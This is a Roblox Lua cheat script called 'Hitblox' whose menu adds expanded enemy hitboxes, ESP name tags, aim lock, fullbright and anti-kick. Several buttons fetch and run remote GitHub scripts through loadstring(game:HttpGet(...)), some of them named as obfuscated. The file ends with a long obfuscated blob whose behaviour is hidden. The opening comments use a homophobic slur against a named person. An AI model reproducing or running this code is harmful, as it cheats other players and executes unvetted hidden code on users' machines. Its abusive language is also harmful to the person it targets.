-- tralalalala
uiLibrary:AddButton("🍪", function()
    playSound("rbxassetid://7115235855")
    StarterGui:SetCore("SendNotification", {
        Title = "disclaimer",
        Text = "this is chatgpt code made by faggot 7timesx xd and free source code for skids!!!!!!!!!!!!",
        Duration = 5
    })
end)

-- as you can see down below its all chatgpt code for anyone whos looking at this page or wtv
-- the person who made this script diddnt even obf it and claimed he made it himself
-- he also sucks at clanning with 37 failed clans in 3-6 months (on mortem metallum)
-- anyways have fun skidding or whatever 
-- 💗💗🩷🩷💯💯

-- Services
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")

-- Player variables
local localPlayer = Players.LocalPlayer
while not localPlayer do
    task.wait()
    localPlayer = Players.LocalPlayer
end

-- Improved team detection function
local function isEnemy(player)
    if player == localPlayer then
        return false -- Always return false for local player
    end
    
    -- Check if the game has teams
    local teams = game:GetService("Teams"):GetTeams()
    if #teams > 1 then
        -- Team-based game
        if localPlayer.Team == nil or player.Team == nil then
            return true  -- Players not in any team are considered enemies
        end
        return localPlayer.Team ~= player.Team
    else
        -- Free-for-all game (no teams)
        return true
    end
end

-- Sound function with better error handling
local function playSound(soundId)
    local sound = Instance.new("Sound")
    sound.SoundId = soundId
    sound.Parent = workspace
    
    local success, err = pcall(function()
        sound:Play()
    end)
    
    if not success then
        warn("Failed to play sound: " .. err)
        sound:Destroy()
        return
    end
    
    sound.Ended:Connect(function()
        sound:Destroy()
    end)
end

-- Load external scripts with error handling
local function loadExternalScript(url)
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Credit-obfuscated-lol/refs/heads/main/OBFCredit"))()
    end)
    
    if not success then
        warn("Failed to load external script: " .. err)
        return false
    end
    return true
end

-- Load first external script
task.wait()
playSound("rbxassetid://12221831")

-- Load UI library
local uiLibrary
local success, err = pcall(function()
    uiLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Arceus-X-UI-Library/main/source.lua"))()
end)

if not success or not uiLibrary then
    error("Failed to load UI library: " .. (err or "unknown error"))
end

-- Configure UI
uiLibrary:SetTitle("Hitblox (v4.7)")
uiLibrary:SetIcon("http://www.roblox.com/asset/?id=91738788645337")
uiLibrary:SetTheme("HighContrast")
task.wait(0.1)
playSound("rbxassetid://195868961")

-- Configuration variables
local hitboxSize = 10
local hitboxTransparency = 0.9
local hitboxEnabled = false
local espEnabled = false
local espGuis = {} -- Stores ESP GUI objects
local hitboxIncreaseButton, hitboxDecreaseButton, fovIncreaseButton, fovDecreaseButton

-- Helper functions
local function applyHitbox(character)
    if not character then return end
    
    -- Skip if this is the local player's character
    local player = Players:GetPlayerFromCharacter(character)
    if player and player == localPlayer then
        return
    end
    
    -- Only apply hitbox if character is alive
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid and humanoid.Health <= 0 then
        return
    end
    
    -- Handle R15 characters differently
    local isR15 = humanoid and humanoid.RigType == Enum.HumanoidRigType.R15
    
    -- HumanoidRootPart modifications
    local rootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
    if rootPart then
        if not rootPart:FindFirstChild("OriginalSize") then
            local originalSize = Instance.new("Vector3Value")
            originalSize.Name = "OriginalSize"
            originalSize.Value = rootPart.Size
            originalSize.Parent = rootPart
        end
        
        rootPart.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
        rootPart.Transparency = hitboxTransparency
        rootPart.BrickColor = BrickColor.new("Dark red")
        rootPart.Material = Enum.Material.ForceField
        rootPart.CanCollide = false
        
        -- For R15, we need to adjust the other parts too
        if isR15 then
            local lowerTorso = character:FindFirstChild("LowerTorso")
            if lowerTorso then
                if not lowerTorso:FindFirstChild("OriginalSize") then
                    local originalSize = Instance.new("Vector3Value")
                    originalSize.Name = "OriginalSize"
                    originalSize.Value = lowerTorso.Size
                    originalSize.Parent = lowerTorso
                end
                lowerTorso.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
                lowerTorso.Transparency = hitboxTransparency
                lowerTorso.BrickColor = BrickColor.new("Dark red")
                lowerTorso.Material = Enum.Material.ForceField
                lowerTorso.CanCollide = false
            end
        end
    end
    
    -- Head modifications
    local head = character:FindFirstChild("Head")
    if head then
        if not head:FindFirstChild("OriginalSize") then
            local originalSize = Instance.new("Vector3Value")
            originalSize.Name = "OriginalSize"
            originalSize.Value = head.Size
            originalSize.Parent = head
        end
        
        head.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
        head.Transparency = hitboxTransparency
        head.BrickColor = BrickColor.new("Bright red")
        head.Material = Enum.Material.ForceField
        head.CanCollide = false
        head.Massless = true
    end
    
    -- For R15, adjust other important parts
    if isR15 then
        local partsToAdjust = {"UpperTorso", "LowerTorso", "LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
        for _, partName in ipairs(partsToAdjust) do
            local part = character:FindFirstChild(partName)
            if part then
                if not part:FindFirstChild("OriginalSize") then
                    local originalSize = Instance.new("Vector3Value")
                    originalSize.Name = "OriginalSize"
                    originalSize.Value = part.Size
                    originalSize.Parent = part
                end
                
                part.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
                part.Transparency = hitboxTransparency
                part.BrickColor = BrickColor.new("Dark red")
                part.Material = Enum.Material.ForceField
                part.CanCollide = false
            end
        end
    end
end

local function resetHitbox(character)
    if not character then return end
    
    -- Skip if this is the local player's character
    local player = Players:GetPlayerFromCharacter(character)
    if player and player == localPlayer then
        return
    end
    
    -- Reset HumanoidRootPart
    local rootPart = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
    if rootPart and rootPart:FindFirstChild("OriginalSize") then
        rootPart.Size = rootPart.OriginalSize.Value
        rootPart.Transparency = 1
        rootPart.BrickColor = BrickColor.new("Medium stone grey")
        rootPart.Material = Enum.Material.Plastic
        rootPart.CanCollide = true
    end
    
    -- Reset Head
    local head = character:FindFirstChild("Head")
    if head and head:FindFirstChild("OriginalSize") then
        head.Size = head.OriginalSize.Value
        head.Transparency = 1
        head.BrickColor = BrickColor.new("Medium stone grey")
        head.Material = Enum.Material.Plastic
        head.CanCollide = true
        head.Massless = false
    end
    
    -- Reset R15 parts
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local isR15 = humanoid and humanoid.RigType == Enum.HumanoidRigType.R15
    
    if isR15 then
        local partsToReset = {"LowerTorso", "UpperTorso", "LeftUpperArm", "RightUpperArm", "LeftUpperLeg", "RightUpperLeg"}
        for _, partName in ipairs(partsToReset) do
            local part = character:FindFirstChild(partName)
            if part and part:FindFirstChild("OriginalSize") then
                part.Size = part.OriginalSize.Value
                part.Transparency = 1
                part.BrickColor = BrickColor.new("Medium stone grey")
                part.Material = Enum.Material.Plastic
                part.CanCollide = true
            end
        end
    end
end

local function destroyCharacterParts(character)
    if not character then return end
    
    -- Skip if this is the local player's character
    local player = Players:GetPlayerFromCharacter(character)
    if player and player == localPlayer then
        return
    end
    
    for _, descendant in ipairs(character:GetDescendants()) do
        if descendant:IsA("BasePart") then
            descendant.Size = Vector3.new(1, 1, 1)
            descendant.Transparency = 0.8
            descendant.BrickColor = BrickColor.new("Dark grey")
            descendant.Material = Enum.Material.SmoothPlastic
            descendant.CanCollide = false
            descendant.Anchored = false
            descendant.Velocity = Vector3.new(0, -50, 0)
        end
    end
end

local function applyHitboxesToAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if isEnemy(player) and player.Character then
            applyHitbox(player.Character)
        end
    end
end

local function resetHitboxesOnAllPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character then
            resetHitbox(player.Character)
        end
    end
end

-- Hitbox toggle system
local hitboxCoroutine
local function toggleHitboxes(enabled)
    hitboxEnabled = enabled
    playSound("rbxassetid://12221976")
    
    if enabled then
        applyHitboxesToAllPlayers()
        
        if not hitboxCoroutine then
            hitboxCoroutine = coroutine.create(function()
                while hitboxEnabled and task.wait(0.5) do
                    applyHitboxesToAllPlayers()
                end
            end)
            coroutine.resume(hitboxCoroutine)
        end
    else
        if hitboxCoroutine then
            coroutine.close(hitboxCoroutine)
            hitboxCoroutine = nil
        end
        resetHitboxesOnAllPlayers()
    end
    
    -- Update button visibility
    if hitboxIncreaseButton and hitboxDecreaseButton then
        hitboxIncreaseButton.Visible = enabled
        hitboxDecreaseButton.Visible = enabled
    end
end

-- ESP system
local function createESP(player)
    if espGuis[player] then
        espGuis[player]:Destroy()
        espGuis[player] = nil
    end
    
    if not player or not player.Character or player == localPlayer then return end
    
    if isEnemy(player) then
        local head = player.Character:FindFirstChild("Head")
        local rootPart = player.Character:FindFirstChild("HumanoidRootPart") or player.Character:FindFirstChild("UpperTorso")
        local targetPart = head or rootPart
        
        if not targetPart then return end
        
        -- Create ESP GUI
        local espGui = Instance.new("BillboardGui")
        espGui.Name = "ESP"
        espGui.Adornee = targetPart
        espGui.Size = UDim2.new(0, 100, 0, 50)
        espGui.StudsOffset = Vector3.new(0, 2, 0)
        espGui.AlwaysOnTop = true
        
        local espLabel = Instance.new("TextLabel", espGui)
        espLabel.Size = UDim2.new(1, 0, 1, 0)
        espLabel.BackgroundTransparency = 1
        espLabel.TextColor3 = Color3.new(1, 0, 0)
        espLabel.TextStrokeTransparency = 0
        espLabel.Text = player.Name
        espLabel.TextScaled = true
        espLabel.Font = Enum.Font.SourceSansBold
        
        espGuis[player] = espGui
        espGui.Parent = targetPart
        
        -- Update function for dynamic sizing
        local function updateEspSize()
            if player.Character and (player.Character:FindFirstChild("HumanoidRootPart") or player.Character:FindFirstChild("UpperTorso")) and 
               localPlayer.Character and (localPlayer.Character:FindFirstChild("HumanoidRootPart") or localPlayer.Character:FindFirstChild("UpperTorso")) then
                local playerRoot = player.Character:FindFirstChild("HumanoidRootPart") or player.Character:FindFirstChild("UpperTorso")
                local localRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart") or localPlayer.Character:FindFirstChild("UpperTorso")
                
                if playerRoot and localRoot then
                    local distance = (localRoot.Position - playerRoot.Position).Magnitude
                    local minSize = 10
                    local maxSize = 100
                    local calculatedSize = math.clamp(maxSize - (distance * 0.5), minSize, maxSize)
                    espGui.Size = UDim2.new(0, calculatedSize, 0, calculatedSize * 0.5)
                end
            end
        end
        
        -- Update periodically
        local lastUpdate = tick()
        local connection
        connection = RunService.RenderStepped:Connect(function()
            if not espGui or not espGui.Parent then
                connection:Disconnect()
                return
            end
            
            if (tick() - lastUpdate) >= 0.1 then
                updateEspSize()
                lastUpdate = tick()
            end
        end)
    end
end

local function toggleESP(enabled)
    espEnabled = enabled
    playSound("rbxassetid://12221976")
    
    if enabled then
        -- Create ESP for all enemies
        for _, player in ipairs(Players:GetPlayers()) do
            if isEnemy(player) then
                createESP(player)
            end
        end
    else
        -- Remove all ESP GUIs
        for _, gui in pairs(espGuis) do
            if gui then
                gui:Destroy()
            end
        end
        espGuis = {}
    end
end

-- Player tracking system with death/respawn handling
local function trackPlayer(player)
    if not player then return end
    
    if isEnemy(player) then
        -- Handle character added (respawn)
        player.CharacterAdded:Connect(function(character)
            task.wait(1) -- Wait for character to fully load
            
            -- Track humanoid for death events
            local humanoid = character:WaitForChild("Humanoid")
            
            -- Function to handle hitbox state based on health
            local function updateHitboxState()
                if hitboxEnabled then
                    if humanoid.Health > 0 then
                        -- Character is alive - apply expanded hitbox
                        applyHitbox(character)
                    else
                        -- Character is dead - reset to normal hitbox
                        resetHitbox(character)
                    end
                end
            end
            
            -- Initial update
            updateHitboxState()
            
            -- Connect health changed event
            humanoid.HealthChanged:Connect(updateHitboxState)
            
            -- Handle ESP if enabled
            if espEnabled then
                createESP(player)
            end
        end)
        
        -- Handle existing character
        if player.Character then
            local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
            if humanoid then
                -- Initial hitbox state
                if hitboxEnabled then
                    if humanoid.Health > 0 then
                        applyHitbox(player.Character)
                    else
                        resetHitbox(player.Character)
                    end
                end
                
                -- Handle ESP if enabled
                if espEnabled then
                    createESP(player)
                end
            end
        end
    end
end

-- Initialize tracking for all players
for _, player in ipairs(Players:GetPlayers()) do
    trackPlayer(player)
end

-- Player added/removed events
Players.PlayerAdded:Connect(trackPlayer)

Players.PlayerRemoving:Connect(function(player)
    if espGuis[player] then
        espGuis[player]:Destroy()
        espGuis[player] = nil
    end
end)

-- UI Elements

-- Brightness button
uiLibrary:AddButton("FullBright", function()
    playSound("rbxassetid://12221967")
    
    -- Set lighting properties
    Lighting.Brightness = 2
    Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
    Lighting.Ambient = Color3.fromRGB(255, 255, 255)
    Lighting.TimeOfDay = "14:00:00"
    Lighting.FogStart = 0
    Lighting.FogEnd = 100000
    Lighting.FogColor = Color3.fromRGB(255, 255, 255)
    
    -- Maintain lighting properties
    local connection
    connection = RunService.Heartbeat:Connect(function()
        Lighting.Brightness = 2
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        Lighting.TimeOfDay = "14:00:00"
        Lighting.FogStart = 0
        Lighting.FogEnd = 100000
        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
    end)
    
    -- Store connection for cleanup
    getgenv().BrightnessConnection = connection
end)

-- Anti-Lag button
uiLibrary:AddButton("AntiLag", function()
    playSound("rbxassetid://12221967")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Al/refs/heads/main/AntiLag", true))()
end)

uiLibrary:AddButton("AntiKick", function()
    playSound("rbxassetid://12221967")
    loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/AntkickLol/refs/heads/main/Antikicklol"))()
end)

-- FOV system
local fovEnabled = false
uiLibrary:AddToggle("FOV Toggle", function(enabled)
    fovEnabled = enabled
    playSound("rbxassetid://12221976")
    
    if fovIncreaseButton and fovDecreaseButton then
        fovIncreaseButton.Visible = enabled
        fovDecreaseButton.Visible = enabled
    end
end, false)

-- Initialize FOV buttons visibility
if fovIncreaseButton and fovDecreaseButton then
    fovIncreaseButton.Visible = false
    fovDecreaseButton.Visible = false
end

-- FOV adjustment buttons
fovIncreaseButton = uiLibrary:AddButton("(Fov +)", function()
    playSound("rbxassetid://12221967")
    local camera = workspace.CurrentCamera
    camera.FieldOfView = math.clamp(camera.FieldOfView + 5, 1, 120)
end)

fovDecreaseButton = uiLibrary:AddButton("(Fov -)", function()
    playSound("rbxassetid://12221967")
    local camera = workspace.CurrentCamera
    camera.FieldOfView = math.clamp(camera.FieldOfView - 5, 1, 120)
end)

-- Hitbox toggle
uiLibrary:AddToggle("Expand Hitbox", function(enabled)
    toggleHitboxes(enabled)
end, false)

-- Hitbox adjustment buttons
hitboxIncreaseButton = uiLibrary:AddButton("(Hitbox +)", function()
    playSound("rbxassetid://12221967")
    hitboxSize = math.clamp(hitboxSize + 5, 1, 50)
    
    if hitboxEnabled then
        applyHitboxesToAllPlayers()
    end
end)

hitboxDecreaseButton = uiLibrary:AddButton("(Hitbox -)", function()
    playSound("rbxassetid://12221967")
    hitboxSize = math.clamp(hitboxSize - 5, 1, 50)
    
    if hitboxEnabled then
        applyHitboxesToAllPlayers()
    end
end)

-- ESP toggle
uiLibrary:AddToggle("ESP", function(enabled)
    toggleESP(enabled)
end, false)

-- First-person toggle
uiLibrary:AddToggle("Fpp Toggle", function(enabled)
    playSound("rbxassetid://12221976")
    
    if enabled then
        local camera = workspace.CurrentCamera
        camera.CameraType = Enum.CameraType.Custom
        localPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
        
        -- Clean up existing connection
        if getgenv().cameraLockConnection then
            getgenv().cameraLockConnection:Disconnect()
            getgenv().cameraLockConnection = nil
        end
    else
        localPlayer.CameraMode = Enum.CameraMode.Classic
    end
end, false)

-- Aim Assist system
uiLibrary:AddButton("AimLock", function()
    playSound("rbxassetid://12221967")
    
    -- Create UI elements
    local screenGui = Instance.new("ScreenGui")
    screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
    screenGui.ResetOnSpawn = false
    
    -- Control panel
    local controlPanel = Instance.new("Frame")
    controlPanel.Size = UDim2.new(0, 99, 0, 44)
    controlPanel.Position = UDim2.new(0, 115, 0, 49)
    controlPanel.AnchorPoint = Vector2.new(0.5, 1)
    controlPanel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    controlPanel.BackgroundTransparency = 0.2
    controlPanel.Active = true
    controlPanel.Parent = screenGui
    
    -- Round corners
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0.8, 0)
    corner.Parent = controlPanel
    
    -- Toggle button
    local toggleButton = Instance.new("TextButton")
    toggleButton.Size = UDim2.new(1, 0, 1, 0)
    toggleButton.Text = "Aim Lock"
    toggleButton.BackgroundTransparency = 1
    toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleButton.TextSize = 10
    toggleButton.Parent = controlPanel
    
    -- Highlight when active
    local outline = Instance.new("UIStroke")
    outline.Thickness = 2
    outline.Color = Color3.fromRGB(255, 255, 0)
    outline.Enabled = false
    outline.Parent = controlPanel
    
    -- Target indicator
    local targetIndicator = Instance.new("Frame")
    targetIndicator.Size = UDim2.new(0, 144, 0, 144)
    targetIndicator.Position = UDim2.new(0.5, -1, 0.5, -20)
    targetIndicator.AnchorPoint = Vector2.new(0.5, 0.5)
    targetIndicator.BackgroundTransparency = 1
    targetIndicator.Parent = screenGui
    
    local targetOutline = Instance.new("UIStroke")
    targetOutline.Thickness = 2
    targetOutline.Color = Color3.fromRGB(1, 0, 0)
    targetOutline.Parent = targetIndicator
    
    local targetCorner = Instance.new("UICorner")
    targetCorner.CornerRadius = UDim.new(1, 0)
    targetCorner.Parent = targetIndicator
    
    -- Toggle functionality
    local aimAssistActive = false
    toggleButton.MouseButton1Click:Connect(function()
        aimAssistActive = not aimAssistActive
        outline.Enabled = aimAssistActive
        
        if not aimAssistActive then
            local camera = workspace.CurrentCamera
            if camera then
                camera.CFrame = camera.CFrame
            end
        end
    end)
    
    -- Enemy check function for aim assist (uses the same isEnemy function)
    local function isEnemyForAimAssist(player)
        return isEnemy(player)
    end
    
    -- Visibility check function
    local function isVisible(targetPosition, character)
        local localCharacter = localPlayer.Character
        if not localCharacter then return false end
        
        local rootPart = localCharacter:FindFirstChild("HumanoidRootPart") or localCharacter:FindFirstChild("UpperTorso")
        if not rootPart then return false end
        
        local ray = Ray.new(rootPart.Position, (targetPosition - rootPart.Position).Unit * 1000)
        local hitPart, hitPosition = workspace:FindPartOnRay(ray, localCharacter)
        
        if hitPart then
            return hitPart:IsDescendantOf(character)
        end
        return false
    end
    
    -- Find best target function
    local function findBestTarget()
        local bestTarget = nil
        local closestDistance = math.huge
        local localCharacter = localPlayer.Character
        
        if not localCharacter then return nil end
        
        local rootPart = localCharacter:FindFirstChild("HumanoidRootPart") or localCharacter:FindFirstChild("UpperTorso")
        if not rootPart then return nil end
        
        local screenGui = localPlayer:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui")
        if not screenGui then return nil end
        
        local camera = workspace.CurrentCamera
        local targetCenter = targetIndicator.AbsolutePosition + (targetIndicator.AbsoluteSize / 2)
        local targetRadius = targetIndicator.AbsoluteSize.X / 2
        
        for _, player in pairs(game.Players:GetPlayers()) do
            if isEnemyForAimAssist(player) and player.Character then
                local character = player.Character
                local enemyRoot = character:FindFirstChild("HumanoidRootPart") or character:FindFirstChild("UpperTorso")
                
                if enemyRoot then
                    local screenPosition, onScreen = camera:WorldToScreenPoint(enemyRoot.Position)
                    local distanceFromCenter = (Vector2.new(screenPosition.X, screenPosition.Y) - targetCenter).Magnitude
                    
                    if onScreen and distanceFromCenter <= targetRadius and distanceFromCenter < closestDistance and isVisible(enemyRoot.Position, character) then
                        closestDistance = distanceFromCenter
                        bestTarget = player
                    end
                end
            end
        end
        
        return bestTarget
    end
    
    -- Aim assist functionality
    local aimAssistConnection
    aimAssistConnection = RunService.RenderStepped:Connect(function()
        if aimAssistActive then
            local target = findBestTarget()
            
            if target and target.Character then
                local enemyRoot = target.Character:FindFirstChild("HumanoidRootPart") or target.Character:FindFirstChild("UpperTorso")
                
                if enemyRoot then
                    local camera = workspace.CurrentCamera
                    if camera then
                        local targetPosition = enemyRoot.Position
                        local cameraPosition = camera.CFrame.Position
                        local targetCFrame = CFrame.new(cameraPosition, targetPosition)
                        camera.CFrame = camera.CFrame:Lerp(targetCFrame, 0.3)
                    end
                end
            end
        end
    end)
    
    -- Store connection for cleanup
    getgenv().AimAssistConnection = aimAssistConnection
    
    -- Draggable UI functionality
    local isDragging = false
    local dragStartPosition = Vector2.new(0, 0)
    local dragStartOffset = UDim2.new(0, 0, 0, 0)
    
    controlPanel.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = true
            dragStartPosition = input.Position
            dragStartOffset = controlPanel.Position
        end
    end)
    
    controlPanel.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and isDragging then
            local dragDelta = input.Position - dragStartPosition
            controlPanel.Position = UDim2.new(
                dragStartOffset.X.Scale, 
                dragStartOffset.X.Offset + dragDelta.X, 
                dragStartOffset.Y.Scale, 
                dragStartOffset.Y.Offset + dragDelta.Y
            )
        end
    end)
    
    game:GetService("UserInputService").InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            isDragging = false
        end
    end)
end)

-- TCmd button
uiLibrary:AddButton("TerminalCmd", function()
    playSound("rbxassetid://12221967")
    
    local success, err = pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/TCmd/refs/heads/main/TerminalCmd", true))()
    end)
    
    if not success then
        warn("Failed to load BlatantCC: " .. err)
    end
end)

-- Cookie button (fun easter egg)
uiLibrary:AddButton("🍪", function()
    playSound("rbxassetid://7115235855")
    StarterGui:SetCore("SendNotification", {
        Title = "$10",
        Text = "🍪 yuymyy",
        Duration = 3
    })
end)

-- Initialize button visibility
if hitboxIncreaseButton and hitboxDecreaseButton then
    hitboxIncreaseButton.Visible = false
    hitboxDecreaseButton.Visible = false
end

if fovIncreaseButton and fovDecreaseButton then
    fovIncreaseButton.Visible = false
    fovDecreaseButton.Visible = false
end

-- Cleanup function
local function cleanup()
    -- Clean up hitboxes
    resetHitboxesOnAllPlayers()
    
    -- Clean up ESP
    for _, gui in pairs(espGuis) do
        if gui then
            gui:Destroy()
        end
    end
    espGuis = {}
    
    -- Clean up connections
    if getgenv().BrightnessConnection then
        getgenv().BrightnessConnection:Disconnect()
    end
    
    if getgenv().AimAssistConnection then
        getgenv().AimAssistConnection:Disconnect()
    end
    
    if getgenv().cameraLockConnection then
        getgenv().cameraLockConnection:Disconnect()
    end
    
    if hitboxCoroutine then
        coroutine.close(hitboxCoroutine)
    end
end

-- Store cleanup function for external access
getgenv().HitbloxCleanup = cleanup

return(function(...)local I,H,f=table,string,bit local n,M,l,O,o,h,N,t,a,c,d=H.byte,H.char,H.sub,I.concat,I.insert,math.ldexp,getfenv and getfenv()or _ENV,setmetatable,select,unpack or I.unpack,tonumber;local i=(function(o)local H,f,G,e,n,c,d=1,function(G)local H=""for e=1,#G,1 do H=H..M(n(G,e)-(22))end return d(H,36)end,"","",{},256,{}for H=0,c-1 do d[H]=M(H)end;local function i()local G=f(l(o,H,H))H=H+1;local e=f(l(o,H,H+G-1))H=H+G;return e end;G=M(i())n[1]=G;while H<#o do local H=i()if d[H]then e=d[H]else e=G..l(G,1,1)end;d[c]=G..l(e,1,1)n[#n+1],G,c=e,e,c+1 end;return I.concat(n)end)("HGiHIJHMKHIKHINHMKHIJGdG^GjGbHIKHI[HMOHG`GbGJGpGbGHGLGfG`HM[HI\\HMOHGaGJGJGFHMbHMdHMfHM[HIXHMOGmGiG^GOHMcGIHIKHHgHMOHGfG^GHGhHM`GFHNKHMgHMoHMeHMgHIKHHhHMOGoG_GNHGZGkG^GiGOGJHMfGIHNbHNFHIKHMiHMKHGeGlG`HNmHNJHNLHMcHIKHIMHMOGIGOGkHIKHNHHMKGHGbGGGKGbGIGJHIKHI]HMOGeHMlGFHGXHOdHOfHOhHOjHMNHMKGMHN[HO`HHXHMOHGgGlHHNGIGKGFGFGlGHGJGbGaHHNHWGHOgHOiHHNGcGKGkG`HNpGlGkHWiGlHWkGaHIKHHiHOmHOoGIHHHHHdHHdGLHGmHHcGfGaGbGkGJHHcHMZHHdHIKHHWHXLHMmHXNHXWGdHM`HHcHXjGlGgGIHX[GlHXXHGjHHdGfGFHHdG`HXGHX_GHGOHIKHHkHXfGFHXOHYJGFHHbG^GFGfHHcHYNGjHHdHXoHWoHIKHI_HM^HM`GmGHGlGaGKHWmHGbGkGcGlHOaHNIHN`GbHGbHXIHWKHIJHGgHMYHMhHYmGJHG\\GiGfHX^GJHZYHIKHHmHMOHJpHKYHJoHLdHJoHL_HJoHLFHHNGpG`GHHYKGJHHNHG^GNGbG`GKHWbGaHILHMOHMKHJFGlHGZHMMHMOHNlHMZHIKHIYHMOHGGGIHMcH[eHM[HIOHMOGLHNmHOgHIKHIWHMOGfGkHZcGkGbHIMHIKHOkHMOHG]GfGIHN_HNLHHNHZ]H[fHOKHIJH\\\\H\\^HNKGOH\\bHM[H\\JHMKH[jHMcHZgH[hHMKGJGlHOiH[KGkGdHOJHMOHGZG`HYNHWkH[MHGZHXjHM\\H]OH]XHYOGJH]\\HM[HM]HMKHGfGbGjG_HNNGeHYKHYkHNYH]hH]jGHGIH]lGFHGFGOGFHM[HO\\HMKHW\\G_H[]H[^HIJHGnHGYH[gHMOH[OH[XH[ZHW`HIKHI`HMjHGIHGbHG]HHNHH]HZbHZdHX_HZYHH^HO\\H]^HMKHGbGmH^kHYoGlGNGOHH^HZNHMKHG\\H]aHYXH[cHMKHG`HZ^HIKH[oHMKHGcGlG_HZgHI^HMOHGFGbGiGbHW_HWaHHNHGeH\\LGhHYZHZjHZlHZnHZnHKkHHNHOXHNMGHHHNH_eH\\LHWcH^ZHMOHJFHJ\\H^^HYlHMKH`XHMcGoH]hGlHMeH]LH_YHIJH_[GkH\\OHWmHIJH_cHIJH\\dH`mHGGGkGhGkGlGMHO`HHeH\\KHX]HX_GfGcHNMH[WH[YH]HGHH_bHMOGFHOOGiGiH_^HIJGJH^LH\\kHO]GJH]KH]MH^OHIJHO^HO`HIZHMOGpHO_HYbH[kHHNHGJH]NHMKHGdGoHGgHGeHGXHGeHGhHGZHG]HG^HG]HalHb_HbaHNWH\\KGIHGXGIGfGHGeGKHWaHGXG`GiH]IHcJHNGHbOHcGHGaHcJGJH^[HWWHMKHHgHa[HMLHMOHHgHHlHIJHIKHIJH`_HIWHIGHcgHaHHcmHchHINHHpHMOH[oHcpHdGHc`HcmHceHcmHbJHdNH[]H`_HIJHIHHcmHdYHIJHIWHGYHcmHHOHcmHMKHdFHMOHdcHchHdNHO\\HZ[HMOHMNHdZHNXHO\\Hd^HH[HG]HIJHO\\Ha[HchH[oHdfHMKHeLHIJHeOHIJHdhH^[HciHdmHdKHe[HdMHcfHchH\\lHd_HdaHchHecHe_HMOHeiHcaHMOHObHeYHe`He\\HdNHchH]FHd_HclHchHdGHchHdJHMOHfNHepHMOHfLHIJHemHMKHbNHdeHfFHebHcmH]eHefHdbHddHfZHMKHfGHcbHaJH[^HHGHMOHdZHHfHMOHchHMKH`_HafHMKHahHNmHakHbJHGgHHdH[bHgIHe^HMLHZ[HMXH[fHeoHMkHMmHM_Hc]H[^HeeHHgHHZHgHHMOHHNHe]HdZHdZHgnHe]HhGH[^Hg\\H\\dHfHHfhHIWHGZHg]HcoHMKHGnHhHHd\\HchHd^Hd`HcmH[hHg\\HeZHhaHd_HWWHO\\HbNHh]HfiHIJHhhHf]Ha[HeFHfnHeJHhWHIJHgGHccHMKHeeHIKHclHMKHOnHXgHY^GMHiZHHcHYpG_HcNGNHYeGlHYgHg`HOhHXcHg_H_aHeoHOXHMgHZgHHjHMOHHdHHMGgGlH\\LH_`HMZHZJHOiG^HWlHZXGaHHKHgLHIJH_eH_gHXIHfJHH[GKH[kGHHZYHjXH[^HhKH^fHfOHcdHgJHhWHgmHe^H[]HO\\HNXHiFHZ[HjpHdnHglHdeHeYHcnHjpH[oHeeHMOHkWHhIHcmHkWHhiHhGHg\\HHnHgHHGpHY\\HXhHHdHiZGMHi\\H_fHi_HiaHYgGeGbG^GaH^HGlGJHHbGJHcIH]iHNlGfGiHYJGjG^HXjHHMHj`H\\oHjWHIKHjlHIJHH[GMHX\\HlJHHKHGjHGnHGiHH[HkmGfGdHOnHlfHlhHH[HZLGHHlXGJHHKGFH`lHbJHGGGHHakHH[HMOGgHWkGhHZdHX]GLH_lGlGFHMZHX_HHcGFHYpGdHlGGlHGpHHcGMHW`HN]H^GHHcHm_H\\IH]oHlJHZFHalGmHGhGpHGFH`mHGaHknHX]H^GH\\ZH_ZHWoHWbHX_HHbH^KH^MHIKHflHYbHN_HMfG^HWnGkHYhGIHYjHZ[HG[HZFHYYHfeHGcGpHGhHGgHG^HWlHZFHM[HfJHl\\GHH[mHIKHdcHMKGbHabH[ZHWcGaHoeHofHogHohHoiHogH_HHIJG^H\\FGJHN[HGXHcJHakHeeH]pHWcHNOHaIHNpGJH_mHjYHYNHcNHaeHf`HamHlKG_HlMHgWHMOHpHHnIHMKGcHZdGiHkpHpeHIJHZLHlGHOZHZ[HWbGNHOjH`_H]IHalGaHnkHM[HiNHIJH^aHacHWcHHNHnkHHNHHZHGKHHbHHZGjIGF`HWdHHZHGaHHHHH